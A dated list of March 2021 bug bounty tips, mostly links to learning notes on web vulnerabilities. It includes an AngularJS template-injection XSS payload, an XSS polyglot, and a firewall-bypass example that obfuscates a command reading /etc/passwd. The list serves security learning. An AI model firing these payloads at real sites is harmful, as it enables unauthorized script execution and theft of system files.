# Bug Bounty Tips - March 2021

# 📅 01-Mar-2021
## Find Contact details for any sites using this dorks
1. site:site.tld intext:"
@site
.tld"
2. site:site.tld "security" | "admin" | "contact"
3. site:site.tld security.txt
4. /hunter.io
5. check whois for registrar info

## Broken Authentication tip
1. Added user in dashboard made him admin 
2. Remove user and again add same user
**Note :**If user gets admin without promoting then its broken issue.

## Mass Assignment/Auto binding vulnerability
- https://itzone.com.vn/en/article/mass-assignment-vulnerability-and-prevention

![img](https://pbs.twimg.com/media/EvONSJtXUAIQ4Xm?format=jpg&name=small)

# 📅 02-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 60
- [XSLT Injection ](https://twitter.com/harshbothra_/status/1366413262410059777?s=20)

## AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29
```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

# 📅 03-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 61
- [Bypassing AWS Policies](https://twitter.com/harshbothra_/status/1366738335218028545?s=20)

# 📅 04-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 62
- [Source Code Review Guidelines](https://twitter.com/harshbothra_/status/1366968601324838912?s=20)

# 📅 06-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 64
- [Hidden Property Abuse (HPA) attack in Node.js](https://twitter.com/harshbothra_/status/1367833358760210434?s=20)

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 65
- [HTTP Request Smuggling in 2020](https://twitter.com/harshbothra_/status/1367935554877202435?s=20)

# 📅 07-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 66
- [Dependency Confusion Attack](https://twitter.com/harshbothra_/status/1368286711038439425?s=20)

# 📅 08-Mar-2021
## m4ll0k Bug Bounty Tools
- https://github.com/m4ll0k/Bug-Bounty-Toolz

# 📅 09-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 67
- [Format String Vulnerabilities](https://twitter.com/harshbothra_/status/1368914428377272320?s=20)

# 📅 10-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 68
- [Mobile Application Dynamic Analysis](https://twitter.com/harshbothra_/status/1369303054777016324?s=20)

## XSS via HTTP Request Smuggling
- https://infosecwriteups.com/exploiting-http-request-smuggling-te-cl-xss-to-website-takeover-c0fc634a661b

# 📅 11-Mar-2021
## Slides from talks
- https://github.com/1ndianl33t/All-in-one_BugBounty_PDF_bundles/blob/master/README.md?s=09

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 69
- [ Insecure Deserialization](https://twitter.com/harshbothra_/status/1369654854612787202?s=20)

## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 70
- [Web Cache Entanglement](https://twitter.com/harshbothra_/status/1369732836266184704?s=20)

## Desirialization Attacks
- https://github.com/kojenov/serial
- https://youtu.be/Y0QxwRyqlh8

## The Best XSS Polyglot! Police cars revolving lightPolice cars revolving light
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Bypass Firewalls
```http
GET /?cc=cat+/etc/passwd

403 Forbidden

GET /?cc=/???/??t+/???/??ss??

200
root:x:0:0:root...

Done bypass firewall
```

# 📅 12-Mar-2021
## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 71
- [OWASP Amass](https://twitter.com/harshbothra_/status/1370103728473182212?s=20)
